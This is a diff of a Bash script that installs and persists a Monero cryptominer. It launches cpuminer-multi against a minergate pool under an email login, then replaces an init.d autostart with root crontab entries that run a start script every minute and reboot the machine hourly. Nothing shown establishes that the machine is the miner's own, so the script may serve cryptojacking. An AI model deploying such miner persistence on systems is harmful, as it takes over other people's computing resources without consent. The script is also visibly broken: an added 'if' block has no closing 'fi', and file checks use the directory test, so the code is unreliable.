@@ -55,11 +55,16 @@ dt=$(date '+%d/%m/%Y %H:%M:%S'); echo "$dt rebooted" >> /home/ubuntu/boot.log
 /sbin/reboot
 EOF
 chmod +x /home/ubuntu/reboot.sh
+chmod +x /home/ubuntu/start.sh
 if [ ! -d "/home/ubuntu/crontab.backup" ]; then
 cp /etc/crontab /home/ubuntu/crontab.backup
 fi
+if [ -f "/home/ubuntu/crontab.backup" ]
+then
+cp /home/ubuntu/crontab.backup /etc/crontab
 echo "* 1 * * * root /home/ubuntu/reboot.sh" >> /etc/crontab
-echo "" > /etc/crontab
+echo "* * * * * root /home/ubuntu/start.sh" >> /etc/crontab
+echo "" >> /etc/crontab
 }
  three(){
 #fix mdadm.conf no array
@@ -72,10 +77,24 @@ pkill miner
 nohup ./cpuminer-multi/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u candrarisky1922@gmail.com -p x -t 1 &>/dev/null &
 }
 four(){
-sudo echo "/home/ubuntu/cpuminer-multi/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u candrarisky1922@gmail.com -p x -t 1" > /etc/init.d/zminer.sh
-sudo chmod +x /etc/init.d/zminer.sh
-sudo chmod ugo+x /etc/init.d/zminer.sh
-sudo update-rc.d zminer.sh defaults
+if [ ! -d "/home/ubuntu/crontab.backup" ]; then
+cp /etc/crontab /home/ubuntu/crontab.backup
+fi
+zminer="/etc/init.d/zminer.sh"
+cronf="/home/ubuntu/crontab.backup"
+if [ -f "$zminer" ]
+then
+	#echo "$zminer found."
+	rm $zminer
+else
+	#echo "$zminer Not Found"
+if [ -f "$cronf" ]
+then
+echo "Default crontab is already backup"
+else
+cp /etc/crontab /home/ubuntu/crontab.backup
+fi
+fi
 }
 minerkill(){
 pkill minerd
